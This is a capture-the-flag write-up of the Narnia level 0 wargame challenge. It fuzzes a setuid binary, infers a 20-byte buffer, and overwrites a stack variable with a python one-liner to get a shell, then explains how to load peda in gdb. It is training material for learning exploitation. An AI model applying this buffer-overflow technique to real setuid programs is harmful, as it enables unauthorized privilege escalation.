# narnia0
We tried not to read the code at first, like a regular CTF would normally be, although checking it out is expected. Lets begin by noticing what is it all about.

~~~~
narnia0@melinda:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: cats barking in a can
buf: cats
val: 0x41414141
WAY OFF!!!!
~~~~

Since this is the first chall, it is expected to be very simple. The basics then:

~~~~
narnia0@melinda:/narnia$ file ./narnia0
./narnia0: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=177ebbd012e00de35da6c62d828ef9ff2201555d, not stripped

strings narnia0
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
exit
__isoc99_scanf
puts
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.0
PTRh
D$,AAAA
[^_]
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 
%24s
buf: %s
val: 0x%08x
/bin/sh
WAY OFF!!!!
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6590
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
narnia0.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
_edata
_fini
__data_start
puts@@GLIBC_2.0
system@@GLIBC_2.0
__gmon_start__
exit@@GLIBC_2.0
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
_init
~~~~

It does not brings us a lot of information, except it is a very simple program. Also, we have a buffer, a hardcoded value and a highly suspected *scanf*. For all that matters, everything indicates a potential buffer overflow ccoming up. Even before disassembling the program, lets do a little more fuzzing:

~~~~
narnia0@melinda:/narnia$ echo AAAAAAAAAAAAAAAAAAAAAA |  ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAAA
val: 0x41004141
WAY OFF!!!!
narnia0@melinda:/narnia$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAA |  ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAAAAA
val: 0x41414141
WAY OFF!!!!
narnia0@melinda:/narnia$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA |  ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAAAAA
val: 0x41414141
WAY OFF!!!!
~~~~

The buffer seems to have a fixed size o 20 bytes. Note that right after *Here is your chance:* in our strings result we see *24%s*. Maybe our scanf is reading 24 bytes? Then the other 4 bytes are overflowing o/
Now we can try to guess how this program works. There is a buffer array of 20 bytes which receives our input. The program reads 24 bytes from our input and copies it into the buffer. Finally, there must be a variable (*val*?) with initial value *0x41414141*. If right before the program ends this is equal to *0xdeadbeef*, shell for you. Otherwise, *WAY OFF!!!*.

Now lets try to prove ourselves right (or wrong). If our guess is right, we should be able to overwrite *val* by sending 20 bytes plus our desired new value.

~~~~
narnia0@melinda:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat -) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
~~~~

Bang! Note we had to use little endian notation (expect after our *file* command). Also, *cat -* is an old trick to keep the shell open and not immediately close.

# About peda
Ok a quick observation here about our tools. When we first sshed to the game we received a message telling us what are our weapons.

~~~~
--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools) in /usr/src/pwntools/
    * radare2 (http://www.radare.org/) should be in $PATH
~~~~

Now, I must confess it took me some time to figure out how to run peda. Since it is not in $PATH as radare2, we need to run it with its full path. Also, peda is not configured in gdbinit, so we must call it inside gdb with *source* command.

~~~~
narnia0@melinda:/narnia$ gdb /.narnia0
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
/.narnia0: No such file or directory.
(gdb) source /usr/local/peda/peda.py
gdb-peda$
~~~~









